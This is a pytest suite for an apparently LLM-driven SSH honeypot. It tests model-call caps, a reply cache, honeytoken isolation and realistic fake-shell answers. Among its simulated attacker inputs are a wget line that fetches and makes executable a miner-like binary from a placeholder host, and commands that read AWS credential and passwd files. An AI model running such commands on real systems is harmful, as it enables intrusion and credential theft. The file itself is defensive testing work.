"""Model cost controls: the per-session model cap, the reply cache, the not-found line in
the persona block, and per-sensor variety in the deterministic shell's answers."""

from __future__ import annotations

import datetime
import logging
from configparser import ConfigParser
from types import SimpleNamespace

import pytest

from agents import hooks, shell
from agents import source_state as ss
from agents.budget import CANNED_INTERACTIVE, SUMMARY_SKIPPED, Budget, BudgetConfig
from agents.replycache import ReplyCache, volatile
from scenarios.loader import list_scenarios, load_scenario

SEED = "c" * 64
IP = "203.0.113.20"


class History:
    """A chat-history chain that records each model call and answers from a table."""

    def __init__(self, replies=None, default="out\r\nroot@srv01:~# "):
        self.replies = replies or {}
        self.default = default
        self.calls: list = []
        self.profiles: list = []
        self.store: dict = {}

    def get_session_history(self, session_id):
        from langchain_core.chat_history import InMemoryChatMessageHistory

        return self.store.setdefault(session_id, InMemoryChatMessageHistory())

    async def ainvoke(self, payload, config=None):
        text = payload["messages"][-1].content
        self.calls.append(text)
        self.profiles.append(payload["decoy_profile"])
        reply = self.replies.get(text, self.default)
        reply = reply(payload) if callable(reply) else reply
        return SimpleNamespace(content=reply, usage_metadata={"total_tokens": 100})


async def ask(history, text, sid="s1", ip=IP, interactive=True, counts=True, logger=None):
    return await hooks.persona_invoke(history, session_id=sid, src_ip=ip, username="root",
                                      text=text, interactive=interactive,
                                      llm_config={"configurable": {"session_id": sid}},
                                      logger=logger, log_extra={"task_name": sid},
                                      counts_as_command=counts)


def cache_on(**kw) -> ReplyCache:
    cache = ReplyCache(**kw)
    hooks.set_reply_cache(cache)
    return cache


# ---- per-session model cap -------------------------------------------------------------------

async def test_model_cap_hands_the_session_to_the_shell_without_closing_it(caplog):
    caplog.set_level("INFO")
    budget = Budget(BudgetConfig(max_model_commands_per_session=2))
    hooks.set_budget(budget)
    history = History()
    logger = logging.getLogger("cap-test")
    await ask(history, "cat a.txt", logger=logger)
    await ask(history, "cat b.txt", logger=logger)
    r = await ask(history, "frobnicate --now", logger=logger)
    assert r.model_capped and not getattr(r, "budget_exceeded", False)
    assert r.content == "-bash: frobnicate: command not found\r\nroot@srv01:~# "
    r = await ask(history, "cat c.txt", logger=logger)
    assert r.content == "cat: c.txt: No such file or directory\r\nroot@srv01:~# "
    assert history.calls == ["cat a.txt", "cat b.txt"]
    assert budget.model_commands("s1") is None or budget.model_commands("s1") == 2
    capped = [rec for rec in caplog.records if rec.getMessage() == "Model cap reached"]
    assert len(capped) == 1 and capped[0].limit == 2
    # what the shell answered is in the history, for the session summary
    assert "frobnicate --now" in [m.content for m in history.store["s1"].messages]
    # exit still ends the session
    assert (await ask(history, "exit")).content == "YYY-END-OF-SESSION-YYY"


async def test_local_and_cached_answers_do_not_count_toward_the_model_cap():
    budget = Budget(BudgetConfig(max_model_commands_per_session=1))
    hooks.set_budget(budget)
    cache_on()
    history = History()
    await ask(history, "cat a.txt", sid="first")
    for _ in range(3):
        assert (await ask(history, "nproc", sid="second")).local_reply
    assert (await ask(history, "cat a.txt", sid="third")).cached_reply
    assert not getattr(await ask(history, "cat b.txt", sid="third"), "model_capped", False)
    assert history.calls == ["cat a.txt", "cat b.txt"]


async def test_overall_command_cap_still_counts_everything():
    hooks.set_budget(Budget(BudgetConfig(max_commands_per_session=2,
                                         max_model_commands_per_session=0)))
    history = History()
    await ask(history, "nproc")
    await ask(history, "cat a.txt")          # capped: the shell answers
    r = await ask(history, "cat b.txt")
    assert r.budget_exceeded and r.content == CANNED_INTERACTIVE and history.calls == []


async def test_deep_source_gets_twice_the_model_cap(tmp_path):
    path = tmp_path / "state.json"

    def mutate(state):
        e = ss.new_entry(IP, datetime.datetime.now(datetime.timezone.utc), 24)
        state.entries[e.key] = e.model_copy(update={"budget_mode": "deep"})
        return state

    ss.update(path, tmp_path / "st", mutate)
    hooks.set_budget(Budget(BudgetConfig(max_model_commands_per_session=1)))
    hooks.set_source_state(ss.SourceStateView(path, check_every=0), seed=SEED)
    history = History()
    for name in ("a", "b", "c"):
        await ask(history, f"cat {name}.txt")
    assert history.calls == ["cat a.txt", "cat b.txt"]


def test_model_cap_and_cache_settings_are_read_from_config():
    from agents.budget import BudgetConfig as Config

    cp = ConfigParser()
    cp.read_string("[budget]\nmax_model_commands_per_session = 7\nreply_cache_entries = 0\n"
                   "reply_cache_max_age = 60\n")
    cfg = Config.from_config(cp, "/tmp")
    assert (cfg.max_model_commands_per_session, cfg.reply_cache_entries,
            cfg.reply_cache_max_age) == (7, 0, 60)
    assert Config().max_model_commands_per_session == 50
    cp.read_string("[budget]\nmax_model_commands_per_session = -1\n")
    with pytest.raises(ValueError):
        Config.from_config(cp, "/tmp")


async def test_listener_model_calls_respect_the_model_cap(tmp_path):
    from listeners.base import ListenerContext
    from listeners.events import EventWriter

    class Answer(SimpleNamespace):
        pass

    class JsonLLM:
        calls = 0

        def complete_json(self, system, user, schema):
            JsonLLM.calls += 1
            return schema.model_validate({"rows": [], "columns": []}) \
                if hasattr(schema, "model_validate") else Answer()

    budget = Budget(BudgetConfig(max_model_commands_per_session=0))
    ctx = ListenerContext(EventWriter(str(tmp_path / "events.jsonl")), bind_host="127.0.0.1",
                          seed="t", budget=budget)
    ctx.json_llm = JsonLLM()
    assert await ctx.llm_json("sql-1", IP, "system", "SELECT 1", object) is None
    assert JsonLLM.calls == 0


# ---- reply cache -----------------------------------------------------------------------------

async def test_identical_replay_is_served_from_the_cache():
    budget = Budget(BudgetConfig())
    hooks.set_budget(budget)
    cache = cache_on()
    history = History({"": "Welcome\r\nroot@srv01:~# "})
    script = ["", "cat /etc/crontab", "nproc", "crontab -l"]
    for text in script:
        await ask(history, text, sid="a", counts=bool(text))
    calls = len(history.calls)
    tokens = budget.global_tokens
    replies = [await ask(history, text, sid="b", ip="198.51.100.3", counts=bool(text))
               for text in script]
    assert len(history.calls) == calls and budget.global_tokens == tokens
    assert [getattr(r, "cached_reply", False) for r in replies] == [True, True, False, True]
    assert budget.cached_commands("b") == 2 and budget.model_commands("b") is None \
        or budget.model_commands("b") == 0
    # the cached turns are in the history the model sees next
    contents = [m.content for m in history.store["b"].messages]
    assert "cat /etc/crontab" in contents and "out\r\nroot@srv01:~# " in contents
    # a different conversation prefix is a different key
    await ask(history, "id", sid="c", ip="198.51.100.4")
    await ask(history, "crontab -l", sid="c", ip="198.51.100.4")
    assert history.calls[-1] == "crontab -l"
    assert cache.hits >= 3


async def test_cache_key_covers_user_and_session_type():
    hooks.set_budget(Budget(BudgetConfig()))
    cache_on()
    history = History(default="x\n")
    await ask(history, "cat a.txt", sid="a", interactive=False)
    await ask(history, "cat a.txt", sid="b", interactive=True)
    await hooks.persona_invoke(history, session_id="c", src_ip=IP, username="admin",
                               text="cat a.txt", interactive=False, llm_config={})
    assert history.calls == ["cat a.txt"] * 3


async def test_a_cache_hit_counts_as_a_model_reply_for_session_state():
    hooks.set_budget(Budget(BudgetConfig()))
    cache_on()
    history = History()
    await ask(history, "cd /opt && touch x", sid="a")
    await ask(history, "cd /opt && touch x", sid="b", ip="198.51.100.3")
    assert not getattr(await ask(history, "ls", sid="b", ip="198.51.100.3"),
                       "local_reply", False)


async def test_honeytoken_never_crosses_sources_through_the_cache(tmp_path):
    path = tmp_path / "state.json"
    planted = "198.51.100.77"

    def mutate(state):
        e = ss.new_entry(planted, datetime.datetime.now(datetime.timezone.utc), 24)
        state.entries[e.key] = e.model_copy(update={"plant_token": True})
        return state

    ss.update(path, tmp_path / "st", mutate)
    hooks.set_budget(Budget(BudgetConfig()))
    hooks.set_source_state(ss.SourceStateView(path, check_every=0), seed=SEED)
    cache = cache_on()
    access, _ = ss.source_token(SEED, planted)

    def leak(payload):
        # a model that prints whatever key is in its persona block
        found = access if access in payload["decoy_profile"] else "AKIA-NONE"
        return f"aws_access_key_id = {found}\r\nroot@srv01:~# "

    def stored() -> list[str]:
        return [reply for _, reply in cache._items.values()]

    history = History({"cat /root/.aws/credentials": leak})
    r = await ask(history, "cat /root/.aws/credentials", sid="p", ip=planted)
    assert access in r.content and stored() == []           # nothing stored at all
    r = await ask(history, "cat /root/.aws/credentials", sid="q", ip="198.51.100.78")
    assert access not in r.content and not getattr(r, "cached_reply", False)
    # the clean reply is stored, but the planted source never reads from the cache
    assert len(stored()) == 1 and all(access not in reply for reply in stored())
    r = await ask(history, "cat /root/.aws/credentials", sid="p2", ip=planted)
    assert access in r.content and not getattr(r, "cached_reply", False)
    assert history.calls == ["cat /root/.aws/credentials"] * 3
    # This proves the gate (planted sources neither read nor write) and that the token is
    # not in the stored text. The key also holds the persona block, so a reply made under a
    # planted block could not match a clean session's key even if it were stored.
    assert all(access not in reply for reply in stored())


async def test_replies_that_must_not_be_shared_are_not_cached():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    history = History({
        # non-volatile lines whose reply names the source: the whole address, and an IPv6
        # address cut to 16 characters as utmp-style columns print it
        "grep sshd /var/log/auth.log": f"Accepted password for root from {IP}\r\n"
                                       "root@srv01:~# ",
        "cat /var/log/btmp.txt": f"root ssh:notty {IP6[:16]}\r\nroot@srv01:~# ",
        "logout now": "YYY-END-OF-SESSION-YYY",
        "explain": "As an AI language model I cannot\r\nroot@srv01:~# ",
        "date": "Thu Nov 19 10:00:00 UTC 2026\r\nroot@srv01:~# ",
        "head -c 8 /dev/urandom | base64": "q83+Vf0n1aQ=\r\nroot@srv01:~# ",
    })
    for text in history.replies:
        await ask(history, text, sid=f"s-{text}", ip=IP6 if "btmp" in text else IP)
    assert len(cache) == 0
    for text in history.replies:
        await ask(history, text, sid=f"t-{text}", ip="198.51.100.9")
    assert len(history.calls) == 2 * len(history.replies)


async def test_model_errors_and_fallbacks_are_not_cached():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()

    class Down(History):
        async def ainvoke(self, payload, config=None):
            raise RuntimeError("provider down")

    await ask(Down(), "cat a.txt")
    assert len(cache) == 0


def test_cache_is_bounded_by_size_and_age():
    now = [0.0]
    cache = ReplyCache(max_entries=2, max_age=10, clock=lambda: now[0])
    cache.put("a", "1")
    cache.put("b", "2")
    cache.get("a")
    cache.put("c", "3")                      # b was least recently used
    assert cache.get("b") is None and cache.get("a") == "1"
    now[0] = 11
    assert cache.get("a") is None and len(cache) == 1
    assert not ReplyCache(max_entries=0).put("a", "1")
    assert not ReplyCache().put("a", "x" * 20000)


def test_volatile_lines():
    for line in ("date", "uptime -p", "ls /tmp; date +%s", "cat /dev/urandom | head",
                 "/usr/bin/mktemp", "openssl rand -hex 4", "ps aux"):
        assert volatile(line), line
    for line in ("cat /etc/crontab", "uname -a", "crontab -l", "ls -la /tmp"):
        assert not volatile(line), line


async def test_summary_of_a_replayed_session_comes_from_the_cache():
    budget = Budget(BudgetConfig())
    hooks.set_budget(budget)
    cache_on()
    history = History({"Examine": "Judgement: MALICIOUS"})

    async def summary(sid, ip):
        assert hooks.session_open(sid, ip) is None
        return await hooks.summary_invoke(history, session_id=sid, src_ip=ip, username="root",
                                          prompt="Examine", llm_config={})

    assert hooks.session_open("a", IP) is None
    await ask(history, "cat a.txt", sid="a")
    assert (await hooks.summary_invoke(history, session_id="a", src_ip=IP, username="root",
                                       prompt="Examine", llm_config={})).content \
        == "Judgement: MALICIOUS"
    assert hooks.session_open("b", "198.51.100.5") is None
    await ask(history, "cat a.txt", sid="b", ip="198.51.100.5")
    r = await hooks.summary_invoke(history, session_id="b", src_ip="198.51.100.5",
                                   username="root", prompt="Examine", llm_config={})
    assert r.content == "Judgement: MALICIOUS" and r.cached_reply
    assert history.calls == ["cat a.txt", "Examine"]
    # a session answered only locally still gets no summary
    assert hooks.session_open("c", "198.51.100.6") is None
    await ask(history, "nproc", sid="c", ip="198.51.100.6")
    r = await hooks.summary_invoke(history, session_id="c", src_ip="198.51.100.6",
                                   username="root", prompt="Examine", llm_config={})
    assert r.content == SUMMARY_SKIPPED


# ---- "command not found" from the model --------------------------------------------------------

async def test_persona_block_gives_the_exact_not_found_line():
    hooks.set_budget(Budget(BudgetConfig()))
    history = History(default="x\n")
    await ask(history, "frobnicate", interactive=True)
    await ask(history, "frobnicate", sid="s2", interactive=False)
    assert "`-bash: NAME: command not found`" in history.profiles[0]
    assert "followed by the prompt" in history.profiles[0]
    # SSH exec runs bash -c; the default host's bash 5.1 adds "line 1"
    assert "`bash: line 1: NAME: command not found`" in history.profiles[1]
    assert shell.not_found(shell.host_for(load_scenario("bank", "s"), "s"), False, "x") == \
        "bash: line 1: x: command not found"


def test_not_found_line_is_never_a_persona_break():
    reply = "-bash: frobnicate: command not found\r\nroot@srv01:~# "
    assert not hooks.breaks_character(reply, "frobnicate")


# ---- variety per sensor, stable within one ----------------------------------------------------

def _facts(host: shell.Host, now: float) -> tuple:
    a = shell.answer
    return tuple(a(host, line, now=now).output for line in
                 ("uname -a", "nproc", "free -m", "ps aux", "w", "who", "cat /proc/loadavg"))


@pytest.mark.parametrize("name", [None] + list_scenarios())
def test_answers_are_stable_per_sensor(name):
    scenario = load_scenario(name, "seed-1") if name else None
    host = shell.host_for(scenario, "seed-1")
    again = shell.host_for(load_scenario(name, "seed-1") if name else None, "seed-1")
    now = 1_790_000_000.0
    assert _facts(host, now) == _facts(again, now)
    # repeated a minute later, nothing a real host keeps fixed has moved
    first, later = _facts(host, now), _facts(host, now + 60)
    assert first[:3] == later[:3]


def test_sensors_differ():
    now = 1_790_000_000.0
    hosts = [shell.host_for(None, f"seed-{n}") for n in range(30)]
    assert {h.kernel for h in hosts} == {shell.DEFAULT_KERNEL}     # one known-good build
    assert len({(h.hardware.cpus, h.hardware.memory_mb, h.hardware.cpu_model)
                for h in hosts}) > 2
    assert len({shell.answer(h, "ps aux", now=now).output.count("\n") for h in hosts}) > 1
    for scenario in list_scenarios():
        shapes = {load_scenario(scenario, f"seed-{n}").hardware.model_dump_json()
                  for n in range(30)}
        assert len(shapes) > 2, scenario


def test_scenario_kernel_and_explicit_hardware_stay_as_written():
    from scenarios.schema import Identity

    s = load_scenario("bank", "seed-9")
    host = shell.host_for(s, "seed-9")
    assert host.release == "5.14.0-427.24.1.el9_4.x86_64"
    ident = s.scenario.identity.model_dump(exclude={"hardware"})
    explicit = Identity.model_validate(dict(ident, hardware={"cpus": 16}))
    s.scenario = s.scenario.model_copy(update={"identity": explicit})
    assert s.hardware.cpus == 16
    assert "16 vCPU" in s.persona_fragment()


def test_preset_hardware_is_what_the_persona_block_shows():
    for n in range(10):
        s = load_scenario("saas", f"seed-{n}")
        host = shell.host_for(s, f"seed-{n}")
        assert f"{host.hardware.cpus} vCPU {host.hardware.cpu_model}" in s.persona_fragment()


def test_logged_in_users_agree_across_w_uptime_who_and_ps():
    now = 1_790_000_000.0
    seen_other = False
    for n in range(40):
        s = load_scenario("saas", f"seed-{n}")
        host = shell.host_for(s, f"seed-{n}")
        others = host.other_sessions(now)
        users = 1 + len(others)
        w = shell.answer(host, "w", now=now, src_ip=IP).output
        assert f"{users} user{'s' if users > 1 else ''}," in w
        assert f"{users} user" in shell.answer(host, "uptime", now=now).output
        assert len(shell.answer(host, "who", now=now, src_ip=IP).output.splitlines()) == users
        ps = shell.answer(host, "ps aux", now=now).output
        for user, src, login, _ in others:
            seen_other = True
            assert f"sshd: {user} [priv]" in ps and src in w
            assert user in shell.answer(host, "cat /etc/passwd", now=now).output
            # the other login is older than the attacker's and the same a minute later
            assert login < now - 60 and host.other_sessions(now + 60)[0][2] == login
        assert w.splitlines()[-1].startswith("root") and IP in w.splitlines()[-1]
    assert seen_other


def test_default_kernel_is_an_ubuntu_22_04_generic_build():
    host = shell.Host(kernel=shell.DEFAULT_KERNEL)
    assert host.release == "5.15.0-105-generic"
    assert host.version.startswith("#115-Ubuntu SMP")
    assert host.machine == "x86_64" and host.platform_known


# ---- a session leaves the reply cache once its history is not a function of the key -----------

IP6 = "2001:db8:85a3:1111:2222:8a2e:370:7334"
IP6_B = "2001:db8:85a3:9999:2222:8a2e:370:1"


def test_shell_marks_answers_that_read_the_clock_or_the_source_address():
    host = shell.host_for(load_scenario("saas", "seed-1"), "seed-1")
    now = 1_790_000_000.0
    for line in ("w", "who", "uptime", "uptime -p", "cat /proc/uptime", "cat /proc/loadavg",
                 "ps aux", "uname -a; uptime"):
        answer = shell.answer(host, line, now=now, src_ip=IP6)
        assert answer is not None and not answer.shareable, line
    for line in ("uname -r", "nproc", "free -m", "cat /etc/os-release", "lscpu", "echo hi",
                 "id", "cat /proc/cpuinfo | grep -c processor"):
        answer = shell.answer(host, line, now=now, src_ip=IP6)
        assert answer is not None and answer.shareable, line


def _address_echo(history):
    """A model that copies the first address-like text it finds in the session so far."""
    def reply(payload):
        for messages in history.store.values():
            for m in messages.messages:
                for prefix in (IP6[:16], IP6_B[:16]):
                    if prefix in m.content:
                        return f"{prefix} 50122 22\r\nroot@srv01:~# "
        return "\r\nroot@srv01:~# "
    return reply


async def test_ipv6_address_cut_by_w_never_reaches_another_source():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    history = History()
    history.replies["echo $SSH_CLIENT"] = _address_echo(history)
    assert (await ask(history, "w", sid="a", ip=IP6)).local_reply
    r = await ask(history, "echo $SSH_CLIENT", sid="a", ip=IP6)
    assert IP6[:16] in r.content
    assert len(cache) == 0                      # the session left the cache at `w`
    history.store.pop("a")
    await ask(history, "w", sid="b", ip=IP6_B)
    r = await ask(history, "echo $SSH_CLIENT", sid="b", ip=IP6_B)
    assert IP6[:16] not in r.content and not getattr(r, "cached_reply", False)
    assert history.calls == ["echo $SSH_CLIENT"] * 2


async def test_a_failed_model_turn_takes_the_session_out_of_the_cache():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()

    class FlakyOnce(History):
        failed = False

        async def ainvoke(self, payload, config=None):
            if not FlakyOnce.failed:
                FlakyOnce.failed = True
                self.calls.append(payload["messages"][-1].content)
                raise RuntimeError("provider down")
            return await super().ainvoke(payload, config)

    history = FlakyOnce()
    await ask(history, "cat a.txt", sid="a")          # fails: the fallback is shown
    await ask(history, "cat b.txt", sid="a")
    assert len(cache) == 0
    await ask(history, "cat a.txt", sid="b", ip="198.51.100.3")
    r = await ask(history, "cat b.txt", sid="b", ip="198.51.100.3")
    assert not getattr(r, "cached_reply", False)
    assert history.calls == ["cat a.txt", "cat b.txt", "cat a.txt", "cat b.txt"]


async def test_a_clock_answer_takes_the_session_out_of_the_cache():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    history = History()
    assert (await ask(history, "uptime", sid="a")).local_reply
    await ask(history, "cat a.txt", sid="a")
    assert len(cache) == 0
    await ask(history, "uptime", sid="b", ip="198.51.100.3")
    assert not getattr(await ask(history, "cat a.txt", sid="b", ip="198.51.100.3"),
                       "cached_reply", False)


async def test_shareable_local_answers_keep_the_session_in_the_cache():
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    history = History()
    for sid, ip in (("a", IP), ("b", "198.51.100.3")):
        assert (await ask(history, "uname -r; nproc", sid=sid, ip=ip)).local_reply
        r = await ask(history, "cat a.txt", sid=sid, ip=ip)
    assert r.cached_reply and len(cache) == 1 and history.calls == ["cat a.txt"]


async def test_the_key_covers_the_replies_not_only_the_inputs():
    """A reply stored under an earlier turn's key that has since aged out or been replaced
    must not be served after a different reply to that earlier turn."""
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    replies = iter(["one\r\nroot@srv01:~# ", "two\r\nroot@srv01:~# ", "x\r\nroot@srv01:~# ",
                    "y\r\nroot@srv01:~# "])
    history = History(default="")
    history.default = None
    history.replies = {"cat a.txt": lambda p: next(replies), "cat b.txt": lambda p: next(replies)}
    await ask(history, "cat a.txt", sid="a")
    await ask(history, "cat b.txt", sid="a")
    first = next(k for k, v in cache._items.items() if v[1].startswith("one"))
    del cache._items[first]                     # the first turn's entry ages out
    await ask(history, "cat a.txt", sid="b", ip="198.51.100.3")      # a fresh, different reply
    r = await ask(history, "cat b.txt", sid="b", ip="198.51.100.3")
    assert not getattr(r, "cached_reply", False) and r.content.startswith("y")


async def test_a_session_that_lost_its_key_leaves_the_cache(monkeypatch):
    monkeypatch.setattr(hooks, "MAX_TRACKED_SESSIONS", 3)
    hooks.set_budget(Budget(BudgetConfig()))
    cache = cache_on()
    history = History()
    await ask(history, "cat a.txt", sid="a")
    await ask(history, "cat b.txt", sid="a")
    for n in range(3):                          # evicts the oldest key: session a's
        await ask(history, "id", sid=f"other-{n}")
    assert "other-0" in hooks._session_keys     # oldest out, not everything cleared
    stored = len(cache)
    r = await ask(history, "cat a.txt", sid="a")    # must not restart from the root key
    assert not getattr(r, "cached_reply", False) and len(cache) == stored


# ---- local answers agree with what the model did ------------------------------------------------

async def test_a_path_the_model_created_is_not_answered_as_missing():
    hooks.set_budget(Budget(BudgetConfig()))
    history = History(default="root@srv01:~# ")
    assert (await ask(history, "/usr/bin/xmr")).local_reply      # nothing has run yet
    await ask(history, "wget -O /usr/bin/xmr http://x/xmr && chmod +x /usr/bin/xmr",
              sid="s2")
    r = await ask(history, "/usr/bin/xmr", sid="s2")
    assert not getattr(r, "local_reply", False) and "No such file" not in r.content


def test_fixed_answers_are_only_facts_no_command_can_change():
    host = shell.host_for(None, "seed-1")
    for line in ("/usr/bin/xmr", "/bin/xmr", "cat /etc/redhat-release", "cat /etc/os-release",
                 "cat /etc/issue", "df -h", "cat /proc/mounts", "nvidia-smi"):
        answer = shell.answer(host, line)
        assert answer is not None and answer.scope != shell.FIXED, line
    for line in ("uname -r", "nproc", "free -m", "lscpu", "cat /proc/cpuinfo", "echo hi",
                 "uptime"):
        assert shell.answer(host, line).scope == shell.FIXED, line


async def test_local_answer_ends_with_the_prompt_the_model_last_showed():
    hooks.set_budget(Budget(BudgetConfig()))
    history = History({"export PS1='$ '": "$ "}, default="x\r\n$ ")
    await ask(history, "export PS1='$ '")
    r = await ask(history, "nproc")
    assert r.content.endswith("\r\n$ ") and "root@srv01" not in r.content


async def test_rhel_prompt_gives_the_directory_or_stops_local_answers():
    hooks.set_budget(Budget(BudgetConfig()))
    history = History({"cd ~": "[root@obk ~]# ", "cd /tmp": "[root@obk tmp]# "},
                      default="x\r\n[root@obk tmp]# ")
    await ask(history, "cd ~")
    r = await ask(history, "cat /proc/version")
    assert r.local_reply and r.content.endswith("GNU/Linux)\r\n[root@obk ~]# ") \
        or r.content.endswith("\r\n[root@obk ~]# ")
    assert r.local_reply
    await ask(history, "cd /tmp")       # [root@obk tmp]: /tmp, /var/tmp, ...: no directory
    for line in ("cat /proc/version", "cat cpuinfo"):
        r = await ask(history, line)
        assert not getattr(r, "local_reply", False) and r.content.endswith("[root@obk tmp]# ")
    await ask(history, "cd ~")          # stays off for the session
    assert not getattr(await ask(history, "nproc"), "local_reply", False)


async def test_persona_block_names_the_other_login_and_the_daemons():
    hooks.set_budget(Budget(BudgetConfig()))
    now = 1_790_000_000.0
    for n in range(40):
        seed = f"seed-{n}"
        scenario = load_scenario("saas", seed)
        host = shell.host_for(scenario, seed)
        if host.other_sessions(now):
            break
    else:
        pytest.fail("no sensor with a second login")
    hooks._seed = seed
    history = History(default="x\n")
    await ask(history, "cat a.txt", sid=f"p-{seed}")
    await hooks.persona_invoke(history, session_id=f"p-{seed}", src_ip=IP, username="root",
                               text="cat b.txt", interactive=True, llm_config={},
                               scenario=scenario)
    profile = history.profiles[-1]
    user, src, _, _ = host.other_sessions(now)[0]
    assert f"{user}" in profile and src in profile
    ps = shell.answer(host, "ps aux", now=now).output
    for daemon in host.daemons():
        assert daemon[1] in ps and daemon[1].split()[0] in profile


# ---- the cache before the cap -------------------------------------------------------------------

async def test_cached_replies_are_served_after_the_model_cap():
    hooks.set_budget(Budget(BudgetConfig(max_model_commands_per_session=1)))
    cache_on()
    history = History()
    await ask(history, "cat a.txt", sid="a")
    await ask(history, "cat b.txt", sid="a")       # a's cap was hit at a.txt: shell answers
    await ask(history, "cat b.txt", sid="seed", ip="198.51.100.4")   # nothing stored for b
    hooks.set_budget(Budget(BudgetConfig(max_model_commands_per_session=0)))
    r = await ask(history, "cat a.txt", sid="c", ip="198.51.100.5")
    assert r.cached_reply and not getattr(r, "model_capped", False)


# ---- timing ---------------------------------------------------------------------------------

async def test_local_and_cached_replies_can_wait_like_a_model_call():
    import time

    hooks.set_budget(Budget(BudgetConfig()))
    cache_on()
    history = History()
    await ask(history, "cat a.txt", sid="a")
    hooks.set_local_delay(60)
    for sid, text, kind in (("b", "nproc", "local_reply"), ("c", "cat a.txt", "cached_reply")):
        start = time.monotonic()
        r = await ask(history, text, sid=sid, ip="198.51.100.3")
        assert getattr(r, kind) and time.monotonic() - start >= 0.03
    hooks.set_local_delay(99_999)
    assert hooks._local_delay_ms == hooks.MAX_LOCAL_DELAY_MS
    cp = ConfigParser()
    cp.read_string("[llm]\nlocal_reply_delay_ms = -1\n")
    with pytest.raises(ValueError):
        hooks.local_delay_ms(cp)
